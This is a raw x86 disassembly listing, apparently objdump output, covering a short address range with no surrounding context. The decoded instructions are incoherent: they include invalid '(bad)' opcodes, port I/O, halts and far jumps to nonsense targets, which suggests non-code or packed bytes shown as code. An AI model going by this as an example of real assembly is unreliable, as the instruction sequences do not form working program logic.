  41d196:	test   eax,0xc057ccc8
  41d19b:	dec    esi
  41d19c:	adc    eax,0x4f92a17f
  41d1a1:	and    ch,BYTE PTR [edi]
  41d1a3:	xchg   esp,eax
  41d1a4:	repz rcl DWORD PTR [esi],0xa2
  41d1a8:	mov    eax,fs
  41d1aa:	xchg   edi,eax
  41d1ab:	sub    ebx,DWORD PTR [edi-0x45b19c1b]
  41d1b1:	jae    0x41d148
  41d1b3:	out    0xcc,al
  41d1b5:	fistp  DWORD PTR [ebx+0x1035ab40]
  41d1bb:	pop    ss
  41d1bc:	xor    al,0x57
  41d1be:	add    eax,0x8ee4577d
  41d1c3:	push   ss
  41d1c4:	jle    0x41d196
  41d1c6:	xchg   DWORD PTR [eax],ebp
  41d1c8:	push   cs
  41d1c9:	sub    DWORD PTR [eax+0x41],ecx
  41d1cc:	aad    0x13
  41d1ce:	addr16 std 
  41d1d0:	retf   
  41d1d1:	int3   
  41d1d2:	pop    esp
  41d1d3:	mov    WORD PTR [ebp+0x604e9b64],?
  41d1d9:	out    dx,eax
  41d1da:	jb     0x41d19d
  41d1dc:	fistp  QWORD PTR [edx]
  41d1de:	popf   
  41d1df:	cmc    
  41d1e0:	fs fs adc esi,eax
  41d1e4:	mov    eax,ds:0x2cbfffea
  41d1e9:	repz jnp 0x41d188
  41d1ec:	dec    edi
  41d1ed:	mov    esp,0x780f763e
  41d1f2:	call   0xff19dd6e
  41d1f7:	jno    0x41d1be
  41d1f9:	scas   al,BYTE PTR es:[edi]
  41d1fa:	cwde   
  41d1fb:	inc    edx
  41d1fc:	ss (bad) 
  41d1fe:	cs mov ch,0xd2
  41d201:	push   esp
  41d202:	lahf   
  41d203:	fist   DWORD PTR [esi+0x33]
  41d206:	sub    al,0xc9
  41d208:	xchg   DWORD PTR ds:0xea3e00,edi
  41d20e:	mov    eax,eax
  41d210:	push   ebp
  41d211:	cdq    
  41d212:	enter  0x1b37,0x37
  41d216:	mov    al,0xd8
  41d218:	mov    ecx,0x35e0c0bf
  41d21d:	push   0xc688deba
  41d222:	(bad)  
  41d223:	push   ebp
  41d224:	jp     0x41d1f0
  41d226:	push   0x62
  41d228:	push   ebx
  41d229:	leave  
  41d22a:	retf   0xc8b2
  41d22d:	or     DWORD PTR [edx-0x31],edx
  41d230:	std    
  41d231:	and    al,0x59
  41d233:	mov    al,0x48
  41d235:	mov    esp,0xe14a7619
  41d23a:	jle    0x41d248
  41d23c:	xchg   ebp,eax
  41d23d:	dec    ebp
  41d23e:	test   DWORD PTR [ecx+ecx*8-0x1e777a63],ebx
  41d245:	jo     0x41d229
  41d247:	jnp    0x41d28e
  41d249:	dec    eax
  41d24a:	push   cs
  41d24b:	and    BYTE PTR [esi],al
  41d24d:	dec    ebx
  41d24e:	(bad)  [edx]
  41d250:	imul   esi,DWORD PTR [ebx+ecx*8],0xffffffe4
  41d254:	mov    ch,0xea
  41d256:	mov    bh,0xd1
  41d258:	(bad)
  41d25c:	adc    DWORD PTR [edx+0x17030e6c],eax
  41d262:	push   edi
  41d263:	jno    0x41d249
  41d265:	mov    dh,0x2e
  41d267:	ins    DWORD PTR es:[edi],dx
  41d268:	(bad)  
  41d269:	push   ss
  41d26a:	retf   
  41d26b:	pop    ebx
  41d26c:	das    
  41d26d:	jnp    0x41d200
  41d26f:	pop    edi
  41d270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d271:	sub    al,0x95
  41d273:	addr16 das 
  41d275:	and    cl,bh
  41d277:	adc    dh,BYTE PTR [edi]
  41d279:	pop    edx
  41d27a:	(bad)  [eax-0x7d13bc92]
  41d280:	ins    BYTE PTR es:[edi],dx
  41d281:	sbb    edx,DWORD PTR [edi]
  41d283:	pop    esi
  41d284:	daa    
  41d285:	sti    
  41d286:	inc    edx
  41d287:	test   eax,0xe94770be
  41d28c:	retf   0x56f0
  41d28f:	sub    ah,bl
  41d291:	sbb    al,0xd4
  41d293:	mov    esi,0xdfe74f3
  41d298:	or     ecx,eax
  41d29a:	cmp    eax,0xd8562d97
  41d29f:	sub    cl,BYTE PTR [ecx-0xee1a00]
  41d2a5:	lea    eax,[eax-0x75e2d414]
  41d2ab:	dec    edx
  41d2ac:	inc    edi
  41d2ad:	cmp    eax,0xcd3d4bbf
  41d2b2:	int3   
  41d2b3:	call   DWORD PTR [eax]
  41d2b5:	jnp    0x41d2e2
  41d2b7:	jb     0x41d288
  41d2b9:	mov    esi,0x6c26d9c7
  41d2be:	ja     0x41d292
  41d2c0:	out    dx,eax
  41d2c1:	dec    ebx
  41d2c2:	leave  
  41d2c3:	jp     0x41d2b0
  41d2c5:	sub    BYTE PTR [ebp-0x22702f57],bl
  41d2cb:	leave  
  41d2cc:	retf   
  41d2cd:	mov    eax,0x67e2cf74
  41d2d2:	(bad)  
  41d2d3:	int3   
  41d2d4:	xchg   ecx,eax
  41d2d5:	dec    esp
  41d2d6:	xchg   ah,ah
  41d2d8:	xor    eax,0xff65fc94
  41d2dd:	jbe    0x41d2c8
  41d2df:	add    al,0xbe
  41d2e1:	popa   
  41d2e2:	idiv   BYTE PTR [edx]
  41d2e4:	popf   
  41d2e5:	jecxz  0x41d2b3
  41d2e7:	dec    ecx
  41d2e8:	pop    edx
  41d2e9:	je     0x41d30d
  41d2eb:	aaa    
  41d2ec:	pusha  
  41d2ed:	ss std 
  41d2ef:	add    ch,BYTE PTR [esi+0x5d]
  41d2f2:	div    DWORD PTR [edi]
  41d2f4:	(bad)  
  41d2f5:	frstor ds:0x71f3ea59
  41d2fb:	and    al,0x36
  41d2fd:	addr16 mov ecx,0xef8e5db3
  41d303:	ja     0x41d299
  41d305:	mov    eax,0x9f6dd098
  41d30a:	jmp    0xc38c:0xda5bab6
  41d311:	xor    ah,BYTE PTR [ebp-0x1d2daa6c]
  41d317:	jg     0x41d345
  41d319:	and    al,0xe2
  41d31b:	lahf   
  41d31c:	cmc    
  41d31d:	add    edx,DWORD PTR [ebx-0x5a]
  41d320:	push   es
  41d321:	div    DWORD PTR [edx+0x45]
  41d324:	jge    0x41d384
  41d326:	mov    al,0x16
  41d328:	mov    ebp,0x71f70f9e
  41d32d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d32e:	cld    
  41d32f:	dec    edi
  41d330:	rcr    DWORD PTR [ecx-0x4f],cl
  41d333:	ins    DWORD PTR es:[edi],dx
  41d334:	push   esp
  41d335:	hlt    
  41d336:	(bad)  
  41d338:	outs   dx,DWORD PTR ds:[esi]
  41d339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d33a:	and    DWORD PTR [esp+ebx*1+0x51218a45],ecx
  41d341:	and    ebx,DWORD PTR [edi+0x6e123c3d]
  41d347:	lock mov ch,BYTE PTR [ebx]
  41d34a:	add    eax,0xa8af4c5
  41d34f:	pop    ebx
  41d350:	or     eax,0x75e32cb9
  41d355:	xor    esp,DWORD PTR [edx+0x285da54d]
  41d35b:	mov    cl,0xc1
  41d35d:	push   ss
  41d35e:	xchg   edx,eax
  41d35f:	cmp    DWORD PTR [esp+esi*1-0x5f],edi
  41d363:	lods   al,BYTE PTR ds:[esi]
  41d364:	aam    0x77
  41d366:	fist   WORD PTR [edx+0x5ca226f1]
  41d36c:	data16 and ah,cl
  41d36f:	repz jae 0x41d30b
  41d372:	outs   dx,BYTE PTR ds:[esi]
  41d373:	sbb    al,0xe7
  41d375:	(bad)  
  41d376:	das    
  41d377:	inc    ebp
  41d378:	jae    0x41d3ab
  41d37a:	mov    bh,0x7a
  41d37c:	out    0x85,al
  41d37e:	mov    ds:0x2b8f77e,al
  41d383:	mov    eax,DWORD PTR [ecx+0x6d]
  41d386:	mov    ch,0x99
  41d388:	mov    eax,0xa6e5cf40
  41d38d:	xchg   edi,eax
  41d38e:	aaa    
  41d38f:	mov    ch,0x24
  41d391:	out    dx,eax
  41d392:	mov    ds:0x24fb4713,eax
  41d397:	jae    0x41d3d3
  41d399:	loope  0x41d36d
  41d39b:	loope  0x41d388
  41d39d:	or     ecx,esp
  41d39f:	mov    ds:0xdc5f8c29,al
  41d3a4:	pushf  
  41d3a5:	add    dl,BYTE PTR [ebx-0x2663e612]
  41d3ab:	mov    al,ds:0x9db84d1f
  41d3b0:	paddq  mm6,mm5
  41d3b3:	sbb    al,BYTE PTR [edx+eiz*4]
  41d3b6:	and    DWORD PTR [ecx-0x6a],eax
  41d3b9:	std    
  41d3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3bb:	xchg   BYTE PTR [ecx],bh
  41d3bd:	inc    ebx
  41d3be:	pop    edx
  41d3bf:	cmp    bl,BYTE PTR [ebp-0x3ea5d202]
  41d3c5:	jnp    0x41d3ef
  41d3c7:	ss mov bh,cl
  41d3ca:	and    eax,0x5b6276e7
  41d3cf:	mov    ds:0x791d094f,al
  41d3d4:	iret   
  41d3d5:	push   ss
  41d3d6:	xchg   edx,eax
  41d3d7:	jl     0x41d377
  41d3d9:	pop    ds
  41d3da:	adc    BYTE PTR [esi],ch
  41d3dc:	xstore-rng (bad)
  41d3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3de:	test   DWORD PTR [ebp+esi*1-0x485f2485],esi
  41d3e5:	enter  0xe996,0x87
  41d3e9:	mov    al,0x6a
  41d3eb:	mov    ds:0xcbc52ed4,eax
  41d3f0:	push   ecx
  41d3f1:	or     BYTE PTR [edx-0x18],bl
  41d3f4:	xchg   dh,ah
  41d3f6:	aam    0xa4
  41d3f8:	(bad)  
  41d3f9:	call   0x8f97ca23
  41d3fe:	cwde   
  41d3ff:	and    DWORD PTR [ebp+eax*2-0x23ef8489],0x9f9fcade
  41d40a:	mov    ds:0x3f447d6a,al
  41d40f:	dec    edx
  41d410:	jge    0x41d477
  41d412:	test   eax,0x53953eac
  41d417:	in     eax,dx
  41d418:	arpl   cx,di
  41d41a:	push   esp
  41d41b:	xchg   edi,eax
  41d41c:	sbb    edi,eax
  41d41e:	jnp    0x41d3a4
  41d420:	xchg   esp,eax
  41d421:	jge    0x41d419
  41d423:	dec    eax
  41d424:	dec    esp
  41d425:	push   edi
  41d426:	push   eax
  41d427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d428:	xor    DWORD PTR gs:[edi+0x65],esi
  41d42c:	test   eax,0x2c9b8470
  41d431:	retf   0xe97
  41d434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d435:	pop    esp
  41d436:	dec    edx
  41d437:	setne  BYTE PTR [edx-0x2b]
  41d43b:	repz inc ecx
  41d43d:	ficomp DWORD PTR [edx-0x4a]
  41d440:	jb     0x41d45a
  41d442:	and    ecx,DWORD PTR [edx+ecx*8]
  41d445:	cmp    DWORD PTR [ebx],edi
  41d447:	daa    
  41d448:	xchg   ebp,eax
  41d449:	and    BYTE PTR [ebx],bl
  41d44b:	inc    edx
  41d44c:	call   0xc86e:0xa5703ac2
  41d453:	sub    bh,BYTE PTR [ebx]
  41d455:	cmc    
  41d456:	mul    DWORD PTR [esi+eax*1]
  41d459:	push   ecx
  41d45a:	mov    ch,0x45
  41d45c:	div    DWORD PTR [ebx]
  41d45e:	push   edi
  41d45f:	xchg   esi,eax
  41d460:	sahf   
  41d461:	das    
  41d462:	jp     0x41d430
  41d464:	scas   eax,DWORD PTR es:[edi]
  41d465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d466:	sub    al,0x82
  41d468:	inc    edi
  41d469:	sbb    ebx,edi
  41d46b:	jbe    0x41d4d9
  41d46d:	push   ecx
  41d46e:	sahf   
  41d46f:	ja     0x41d483
  41d471:	and    al,0xe
  41d473:	jmp    DWORD PTR [eax+0x5b]
  41d476:	push   cs
  41d477:	mov    ecx,0xa8047d2a
  41d47c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d47d:	test   DWORD PTR [edx-0x51],edi
  41d480:	pop    ebx
  41d481:	adc    ah,BYTE PTR [eax-0x41]
  41d484:	pop    ebp
  41d485:	test   eax,0x72f47135
  41d48a:	(bad)  
  41d48c:	push   eax
  41d48d:	scas   al,BYTE PTR es:[edi]
  41d48e:	loope  0x41d496
  41d490:	pop    DWORD PTR [ebp+0x9]
  41d493:	fild   QWORD PTR [edx]
  41d495:	ins    BYTE PTR es:[edi],dx
  41d496:	or     eax,DWORD PTR [edi]
  41d498:	lea    esi,[ebx+0x1e]
  41d49b:	adc    BYTE PTR [ebp+0x4983735b],bl
  41d4a1:	push   0xffffff80
  41d4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4a4:	or     al,0x0
  41d4a6:	adc    eax,0x2e4188c8
  41d4ab:	adc    DWORD PTR [edx-0x40ea683c],ecx
  41d4b1:	cwde   
  41d4b2:	sub    BYTE PTR [ebx],cl
  41d4b4:	pop    es
  41d4b5:	repnz xchg esi,eax
  41d4b7:	out    0x23,eax
  41d4b9:	cmp    bl,BYTE PTR [edx-0x4921a631]
  41d4bf:	pop    esp
  41d4c0:	add    BYTE PTR [esi],0xed
  41d4c3:	mov    ch,0x2
  41d4c5:	fs or  edx,ecx
  41d4c8:	hlt    
  41d4c9:	and    ebx,ebx
  41d4cb:	outs   dx,BYTE PTR ds:[esi]
  41d4cc:	jp     0x41d507
  41d4ce:	xor    edx,DWORD PTR [edx-0x46acd95f]
  41d4d4:	inc    edi
  41d4d5:	adc    eax,0x55106f6a
  41d4da:	push   ebp
  41d4db:	fdiv   QWORD PTR [esi-0x5815a8ab]
  41d4e1:	cs adc eax,0x75a66bd2
  41d4e7:	jno    0x41d4e5
  41d4e9:	push   ebp
  41d4ea:	fisub  WORD PTR [edi]
  41d4ec:	rcr    DWORD PTR [eax],0x8a
  41d4ef:	imul   ecx,edi,0x45
  41d4f2:	in     al,dx
  41d4f3:	jecxz  0x41d545
  41d4f5:	mov    al,BYTE PTR [ebx]
  41d4f7:	icebp  
  41d4f8:	shl    al,0x21
  41d4fb:	lods   al,BYTE PTR ds:[esi]
  41d4fc:	dec    ebx
  41d4fd:	sbb    DWORD PTR [esi],esp
  41d4ff:	adc    DWORD PTR [ebx+0x2f36a913],esp
  41d505:	mov    ebx,0x68788920
  41d50a:	int3   
  41d50b:	hlt    
  41d50c:	push   ecx
  41d50d:	ins    DWORD PTR es:[edi],dx
  41d50e:	sbb    al,0x1a
  41d510:	mov    WORD PTR [ebx-0x2],cs
  41d513:	add    ebp,DWORD PTR [esi-0x38]
  41d516:	sub    bl,BYTE PTR [ebx]
  41d518:	xchg   ecx,eax
  41d519:	pop    es
  41d51a:	and    BYTE PTR [edx+0x3d77374c],al
  41d520:	daa    
  41d521:	pusha  
  41d522:	jnp    0x41d4e6
  41d524:	jno    0x41d4f6
  41d526:	popf   
  41d527:	push   es
  41d528:	leave  
  41d529:	push   0x6b
  41d52b:	and    bh,bl
  41d52d:	xor    BYTE PTR [eax+0xd],cl
  41d530:	int    0x29
  41d532:	enter  0x8a57,0x87
  41d536:	jno    0x41d4c5
  41d538:	call   0x23cf:0x45917355
  41d53f:	aaa    
  41d540:	jmp    0x3b33:0xf9a1ac42
  41d547:	sub    BYTE PTR [ebp+0xd],dh
  41d54a:	cmp    DWORD PTR [esi+0x522098fc],0x10
  41d551:	mov    eax,ds:0xde6d5594
  41d556:	sahf   
  41d557:	xchg   DWORD PTR [ebp+ebp*4-0x63e244f6],edx
  41d55e:	sbb    BYTE PTR [edx+0x95791f3],bh
  41d564:	cld    
  41d565:	call   esp
  41d567:	jp     0x41d4f1
  41d569:	sbb    al,0xf7
  41d56b:	pop    edi
  41d56c:	test   ah,ch
  41d56e:	or     ebx,DWORD PTR ds:0xd8154350
  41d574:	call   0x91cc:0x9b228fd1
  41d57b:	push   ebp
  41d57c:	mov    ds:0x7afd2e82,eax
  41d581:	fidiv  DWORD PTR [ebp+0x2]
  41d584:	xor    esp,DWORD PTR [edx]
  41d586:	xchg   ecx,eax
  41d587:	pop    ebp
  41d588:	sub    BYTE PTR [edx-0x38b073e0],bl
  41d58e:	imul   esi,DWORD PTR [eax],0x1ee1c56b
  41d594:	push   cs
  41d595:	pop    edx
  41d596:	push   esi
  41d597:	arpl   WORD PTR [ebp-0x28449aba],si
  41d59d:	pop    edx
  41d59e:	add    edi,eax
  41d5a0:	je     0x41d5e9
  41d5a2:	cld    
  41d5a3:	mov    bh,0xfc
  41d5a5:	mov    dh,BYTE PTR [esi]
  41d5a7:	add    ch,BYTE PTR [eax-0x46c5aa58]
  41d5ad:	jo     0x41d5bc
  41d5af:	adc    eax,0xa4c00cba
  41d5b4:	mul    BYTE PTR [ebp-0x2192ed06]
  41d5ba:	fsubr  DWORD PTR [eax-0x71]
  41d5bd:	cld    
  41d5be:	xor    dh,bl
  41d5c0:	daa    
  41d5c1:	dec    eax
  41d5c2:	lahf   
  41d5c3:	nop
  41d5c4:	sub    al,0xe5
  41d5c6:	imul   esi,DWORD PTR ds:0x35d4518a,0x9770f110
  41d5d0:	xchg   sp,ax
  41d5d2:	sub    ch,cl
  41d5d4:	jne    0x41d5f4
  41d5d6:	add    dh,BYTE PTR [esp+ebp*2]
  41d5d9:	hlt    
  41d5da:	inc    esi
  41d5db:	popf   
  41d5dc:	jnp    0x41d5b8
  41d5de:	adc    al,0x96
  41d5e0:	imul   edi,esi,0x19
  41d5e3:	mov    eax,0xe79f9087
  41d5e8:	sbb    DWORD PTR [edx],ecx
  41d5ea:	pop    ds
  41d5eb:	cmp    eax,0xf83c57da
  41d5f0:	or     dl,cl
  41d5f2:	retf   0xe337
  41d5f5:	mov    dh,0x1b
  41d5f7:	push   edi
  41d5f8:	xor    BYTE PTR [edx+esi*4+0x2ad9f238],dh
  41d5ff:	mov    ch,0xcc
  41d601:	and    eax,0x1a8c5cab
  41d606:	adc    BYTE PTR [ebp-0x1e],bl
  41d609:	jge    0x41d5a4
  41d60b:	bound  esi,QWORD PTR [ebp-0x370f063f]
  41d611:	xchg   ebp,eax
  41d612:	ins    BYTE PTR es:[edi],dx
  41d613:	int    0xc3
  41d615:	stc    
  41d616:	cmc    
  41d617:	cdq    
  41d618:	mov    al,ch
  41d61a:	dec    esi
  41d61b:	addr16 addr16 pop edi
  41d61e:	sbb    eax,0x903222ec
  41d623:	jnp    0x41d61a
  41d625:	xor    esi,edi
  41d627:	inc    edi
  41d628:	jle    0x41d5fb
  41d62a:	ret    
  41d62b:	inc    ecx
  41d62c:	pop    edi
  41d62d:	fcomp  QWORD PTR [esi-0x336afb71]
  41d633:	cmp    ecx,esp
  41d635:	add    esp,DWORD PTR [esi]
  41d637:	inc    esp
  41d638:	leave  
  41d639:	int    0x17
  41d63b:	and    BYTE PTR [ebp-0x7f],cl
  41d63e:	sbb    eax,0x93af4d71
  41d643:	jg     0x41d668
  41d645:	and    BYTE PTR [edx+0x0],dh
  41d648:	ins    BYTE PTR es:[edi],dx
  41d649:	test   eax,0x623d81bc
  41d64e:	jnp    0x41d634
  41d650:	mov    ch,0xfe
  41d652:	std    
  41d653:	mov    bl,0xc1
  41d655:	jge    0x41d68f
  41d657:	(bad)  
  41d658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d659:	retf   
  41d65a:	or     eax,0x7adaa8aa
  41d65f:	pop    ecx
  41d660:	lahf   
  41d661:	sti    
  41d662:	add    BYTE PTR [eax+esi*8+0x79],al
  41d666:	xchg   edi,eax
  41d667:	(bad)  
  41d668:	mov    edx,0xf65de899
  41d66d:	cdq    
  41d66e:	leave  
  41d66f:	test   DWORD PTR [edx-0x66],edx
  41d672:	inc    ecx
  41d673:	pop    ss
  41d674:	data16 and BYTE PTR [esi-0x2a7838ba],dh
  41d67b:	loop   0x41d6c0
  41d67d:	jnp    0x41d608
  41d67f:	aaa    
  41d680:	or     al,0x60
  41d682:	mov    ebx,0x2daf36e7
  41d687:	rol    BYTE PTR [esp+eiz*8],1
  41d68a:	or     DWORD PTR gs:[edi+0x48],edx
  41d68e:	lahf   
  41d68f:	xchg   BYTE PTR [esi-0x72a60ec3],ah
  41d695:	outs   dx,DWORD PTR ds:[esi]
  41d696:	xchg   edx,eax
  41d697:	pop    esi
  41d698:	push   eax
  41d699:	fisub  DWORD PTR [ebx+0x52]
  41d69c:	adc    dh,bh
  41d69e:	retf   
  41d69f:	outs   dx,DWORD PTR ds:[esi]
  41d6a0:	stos   BYTE PTR es:[edi],al
  41d6a1:	cld    
  41d6a2:	jo     0x41d68a
  41d6a4:	xor    DWORD PTR [edx+0x5cf95ec3],ebp
  41d6aa:	es cmp eax,0x4ee05dff
  41d6b0:	adc    al,0x7c
  41d6b2:	or     bh,BYTE PTR [esi+0x26]
  41d6b5:	ins    BYTE PTR es:[edi],dx
  41d6b6:	call   0x7c0a:0x963c661f
  41d6bd:	fsubr  QWORD PTR [ebx-0x1b720586]
  41d6c3:	xchg   esi,eax
  41d6c4:	leave  
  41d6c5:	cmc    
  41d6c6:	mov    ebx,0x2e8ee10b
  41d6cb:	inc    edi
  41d6cc:	mov    dl,0x60
  41d6ce:	push   ebx
  41d6cf:	jge    0x41d6bb
  41d6d1:	add    eax,0xd2b809c2
  41d6d6:	(bad)  
  41d6d7:	jp     0x41d667
  41d6d9:	jno    0x41d73e
  41d6db:	in     al,dx
  41d6dc:	xor    bl,bl
  41d6de:	jns    0x41d677
  41d6e0:	or     DWORD PTR [eax-0x53],ecx
  41d6e3:	adc    al,0x10
  41d6e5:	inc    esi
  41d6e6:	jmp    0x41d74c
  41d6e8:	jecxz  0x41d71c
  41d6ea:	mov    ?,ecx
  41d6ec:	lds    eax,FWORD PTR [esi+0x462a968]
  41d6f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6f3:	add    eax,0x75750e7f
  41d6f8:	jmp    0x41d70b
  41d6fa:	lea    edx,[edx+ecx*4-0x616cc1c2]
  41d701:	outs   dx,BYTE PTR ds:[esi]
  41d702:	in     al,0x77
  41d704:	aad    0x49
  41d706:	jecxz  0x41d778
  41d708:	fstp   DWORD PTR [ebp+0x44]
  41d70b:	mov    al,0x29
  41d70d:	ds dec ecx
  41d70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d710:	sub    al,ah
  41d712:	stc    
  41d713:	pop    esi
  41d714:	loopne 0x41d770
  41d716:	hlt    
  41d717:	mov    ds:0x13bb5140,al
  41d71c:	daa    
  41d71d:	inc    esi
  41d71e:	inc    edx
  41d71f:	lods   eax,DWORD PTR ds:[esi]
  41d720:	jle    0x41d761
  41d722:	ret    0xb5be
  41d725:	xor    al,0x37
  41d727:	or     ch,BYTE PTR [ebx+0x38e1ad04]
  41d72d:	ror    DWORD PTR [ebp+0x794aa9ed],1
  41d733:	(bad)  
  41d735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d736:	mov    eax,0xe6f60039
  41d73b:	rcl    esi,0x64
  41d73e:	sahf   
  41d73f:	jecxz  0x41d74c
  41d741:	jge    0x41d797
  41d743:	xchg   ebx,eax
  41d744:	sti    
  41d745:	cmc    
  41d746:	mov    bl,0xa6
  41d748:	push   cs
  41d749:	and    eax,DWORD PTR [ebx]
  41d74b:	jb     0x41d7ba
  41d74d:	ds rol eax,cl
  41d750:	stc    
  41d751:	mov    cl,0x4a
  41d753:	daa    
  41d754:	cld    
  41d755:	xor    ebx,DWORD PTR [ebx]
  41d757:	pop    ds
  41d758:	(bad)  
  41d759:	push   ss
  41d75a:	lea    ebx,[eax-0x2e]
  41d75d:	inc    edx
  41d75e:	add    eax,0x55ddefa4
  41d763:	into   
  41d764:	inc    ebp
  41d765:	icebp  
  41d766:	lds    esi,FWORD PTR [esi+esi*8-0x2a]
  41d76a:	rcl    DWORD PTR [esi+esi*1-0x77],1
  41d76e:	ffreep st(3)
  41d770:	push   0x9141a5f4
  41d775:	push   ds
  41d776:	lahf   
  41d777:	inc    eax
  41d778:	repnz aad 0x9c
  41d77b:	aaa    
  41d77c:	aaa    
  41d77d:	sar    ebx,1
  41d77f:	outs   dx,DWORD PTR ds:[esi]
  41d780:	out    dx,al
  41d781:	test   DWORD PTR [ebx],eax
  41d783:	ins    BYTE PTR es:[edi],dx
  41d784:	test   WORD PTR [eax+0x75],bp
  41d788:	les    ebp,FWORD PTR [esp+ebx*8-0x6222c749]
  41d78f:	mov    eax,0xedbbee6d
  41d794:	cdq    
  41d795:	pop    ecx
  41d796:	lahf   
  41d797:	jecxz  0x41d78c
  41d799:	xchg   ecx,eax
  41d79a:	outs   dx,DWORD PTR ss:[esi]
  41d79c:	or     dl,bh
  41d79e:	xor    dl,BYTE PTR [di-0xf1b]
  41d7a3:	aas    
  41d7a4:	loope  0x41d7b7
  41d7a6:	jecxz  0x41d7aa
  41d7a8:	out    dx,al
  41d7a9:	inc    eax
  41d7aa:	retf   
  41d7ab:	in     eax,0x53
  41d7ad:	jno    0x41d73d
  41d7af:	or     eax,0xbd2dd4d1
  41d7b4:	mov    al,0xf2
  41d7b6:	test   al,0xe8
  41d7b8:	push   esi
  41d7b9:	add    eax,0xdf45e152
  41d7be:	sbb    DWORD PTR [esp+edx*8+0x58cf3190],esi
  41d7c5:	(bad)  
  41d7c6:	sbb    al,0xde
  41d7c8:	ins    BYTE PTR es:[edi],dx
  41d7c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7ca:	pop    ecx
  41d7cb:	pop    edx
  41d7cc:	xchg   ebx,eax
  41d7cd:	push   0xc4e9dc98
  41d7d2:	ja     0x41d790
  41d7d4:	ret    0xb8bf
  41d7d7:	push   es
  41d7d8:	mov    ch,0xd4
  41d7da:	(bad)  
  41d7db:	scas   eax,DWORD PTR es:[edi]
  41d7dc:	adc    eax,0x4cc09841
  41d7e1:	xor    edx,edi
  41d7e3:	fbld   TBYTE PTR [ecx-0x68739e87]
  41d7e9:	into   
  41d7ea:	sub    eax,0x6281b14c
  41d7ef:	lock sti 
  41d7f1:	xchg   ecx,eax
  41d7f2:	dec    eax
  41d7f3:	pusha  
  41d7f4:	aam    0x88
  41d7f6:	popf   
  41d7f7:	sbb    ebp,DWORD PTR gs:[ebx+0x20f3b99c]
  41d7fe:	cwde   
  41d7ff:	inc    edx
  41d800:	ins    DWORD PTR es:[edi],dx
  41d801:	xlat   BYTE PTR ds:[ebx]
  41d802:	into   
  41d803:	or     DWORD PTR [eax+0x6f],ebp
  41d806:	xchg   esi,eax
  41d807:	adc    DWORD PTR [esi-0x45],edx
  41d80a:	sbb    ebp,edx
  41d80c:	les    edi,FWORD PTR [edx+eiz*2+0x21806955]
  41d813:	int    0x51
  41d815:	inc    ebp
  41d816:	and    eax,0xeedc91b9
  41d81b:	adc    al,0xcf
  41d81d:	pop    ds
  41d81e:	and    al,0x93
  41d820:	sub    DWORD PTR [ebp+0x36],esi
  41d823:	lods   al,BYTE PTR ds:[esi]
  41d824:	xor    DWORD PTR [edi-0x48b8fc24],0x7d140bc4
  41d82e:	clc    
  41d82f:	int3   
  41d830:	and    eax,0x2afcb334
  41d835:	call   0x23ee4ac0
  41d83a:	ins    DWORD PTR es:[edi],dx
  41d83b:	dec    esp
  41d83c:	loopne 0x41d857
  41d83e:	jecxz  0x41d839
  41d840:	ret    
  41d841:	std    
  41d842:	pop    esi
  41d843:	pop    edx
  41d844:	fst    QWORD PTR cs:[esi]
  41d847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d848:	push   eax
  41d849:	test   DWORD PTR [edx],edi
  41d84b:	xor    DWORD PTR [eax-0x32],ebp
  41d84e:	dec    edi
  41d84f:	ror    BYTE PTR [eax],1
  41d851:	sbb    dh,BYTE PTR [esi]
  41d853:	xchg   ebp,eax
  41d854:	cdq    
  41d855:	mov    ?,edi
  41d857:	cmc    
  41d858:	mov    dh,0x64
  41d85a:	push   ss
  41d85b:	stos   DWORD PTR es:[edi],eax
  41d85c:	fsubrp st(3),st
  41d85e:	mov    esp,0x6420e22c
  41d863:	dec    esi
  41d864:	and    DWORD PTR [ebp+eiz*8+0x21],esi
  41d868:	retf   
  41d869:	and    DWORD PTR [ecx-0x70d5513e],0xffffffc4
  41d870:	cmc    
  41d871:	fstp   QWORD PTR [ecx-0x2f]
  41d874:	cld    
  41d875:	push   esp
  41d876:	(bad)  
  41d877:	clc    
  41d878:	mov    edi,0xf143c184
  41d87d:	mov    ?,WORD PTR ds:0x78a03361
  41d883:	mov    bh,0x97
  41d885:	jge    0x41d889
  41d887:	aas    
  41d888:	repnz sub ah,BYTE PTR [eax]
  41d88b:	sub    dh,dl
  41d88d:	sub    al,BYTE PTR [edi+0x7e15a02b]
  41d893:	adc    bl,BYTE PTR [ecx+0x31d23a96]
  41d899:	inc    edi
  41d89a:	and    bl,BYTE PTR [edi]
  41d89c:	adc    BYTE PTR [ebx],al
  41d89e:	arpl   WORD PTR [ebp+0x6fe0db79],dx
  41d8a4:	les    ebx,FWORD PTR [edi+0x63]
  41d8a7:	lods   eax,DWORD PTR ds:[esi]
  41d8a8:	xlat   BYTE PTR ds:[ebx]
  41d8a9:	shl    bl,0x23
  41d8ac:	push   esi
  41d8ad:	xchg   edi,eax
  41d8ae:	aaa    
  41d8af:	jecxz  0x41d8f6
  41d8b1:	pushf  
  41d8b2:	mov    al,0x3d
  41d8b4:	mov    eax,ds:0x29b0f2a5
  41d8b9:	(bad)  
  41d8ba:	mov    ebp,0x3786e902
  41d8bf:	mov    bh,0x6a
  41d8c1:	jb     0x41d882
  41d8c3:	mov    ebp,0x546eda49
  41d8c8:	jne    0x41d90e
  41d8ca:	ret    
  41d8cb:	mov    edx,0x5329ff6e
  41d8d0:	mov    WORD PTR [esi],?
  41d8d2:	lea    esp,[ebp-0x13]
  41d8d5:	out    0xc0,al
  41d8d7:	int    0x76
  41d8d9:	je     0x41d901
  41d8db:	mov    DWORD PTR [edi+0x14],esp
